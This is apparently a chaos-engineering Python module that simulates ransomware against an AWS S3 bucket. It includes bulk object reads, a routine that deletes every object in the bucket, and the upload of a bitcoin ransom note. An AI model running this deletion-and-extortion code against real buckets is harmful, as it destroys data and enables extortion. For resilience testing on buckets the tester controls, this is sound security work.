"""Defines actions for InfoSec attacks against S3"""

import os
import random
import string
import time
import uuid
from typing import List

from chaosaws import aws_client
from chaoslib.exceptions import FailedActivity
from chaoslib.types import Configuration, Secrets
from logzero import logger

__all__ = [
    "put_dummy_objects",
]


def put_dummy_objects(
    bucket_name: str,
    objects_count: int,
    prefix: str = None,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> bool:
    client = aws_client("s3", configuration, secrets)

    for _ in range(objects_count):
        obj_key = str(uuid.uuid4()) + ".txt"
        if prefix:
            obj_key = os.path.join(prefix, obj_key)
        payload = "".join(random.choices(string.ascii_letters, k=128))

        logger.info("Generating dummy S3 object %s", obj_key)
        client.put_object(Bucket=bucket_name, Key=obj_key, Body=payload)

    return True


def ransom_get_objects(
    bucket_name: str,
    num_operations: int,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> bool:
    client = aws_client("s3", configuration, secrets)

    object_keys = list_all_bucket_objects(client, bucket_name)

    idx = 0
    objects_count = len(object_keys)
    for _ in range(num_operations):
        key = object_keys[idx]
        idx = idx + 1 if idx + 1 < objects_count else 0

        response = client.get_object(Bucket=bucket_name, Key=key)
        response["Body"].read()

    return True


def ransom_full_attack(
    bucket_name: str,
    num_operations: int,
    delete_delay_seconds: int = 0,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> bool:
    client = aws_client("s3", configuration, secrets)

    logger.info("List and get all objects in bucket %s", bucket_name)
    object_keys = list_all_bucket_objects(client, bucket_name)

    idx = 0
    objects_count = len(object_keys)
    for _ in range(num_operations):
        key = object_keys[idx]
        idx = idx + 1 if idx + 1 < objects_count else 0

        response = client.get_object(Bucket=bucket_name, Key=key)
        response["Body"].read()

    logger.info("Waiting %d seconds before deleting all objects", delete_delay_seconds)
    time.sleep(delete_delay_seconds)

    logger.info("Deleting all bucket objects for %s", bucket_name)
    for key in object_keys:
        client.delete_object(
            Bucket=bucket_name,
            Key=key,
        )

    logger.info("Uploading ransom note in bucket %s", bucket_name)
    ransom_msg = """Dear Acme.company,
    you've been victims of a cryptolocker attack.

    We are now in the possession of all your files. If you wish to have them back, please transfer 1Mln USD to the following bitcoin account @bitcoinfantastic.

    Sincerely,
    Your friendly neighborhood hacker.
    """
    client.put_object(Bucket=bucket_name, Key="ransom-note.txt", Body=ransom_msg)

    return True


def list_all_bucket_objects(client, bucket_name: str) -> List[str]:
    objects = []
    continuation_token = None

    while True:
        params = {"Bucket": bucket_name}
        if continuation_token:
            params["ContinuationToken"] = continuation_token

        response = client.list_objects_v2(**params)
        objects.extend(response["Contents"])
        if response["IsTruncated"]:
            continuation_token = response["NextContinuationToken"]
        else:
            break

    return [x["Key"] for x in objects]
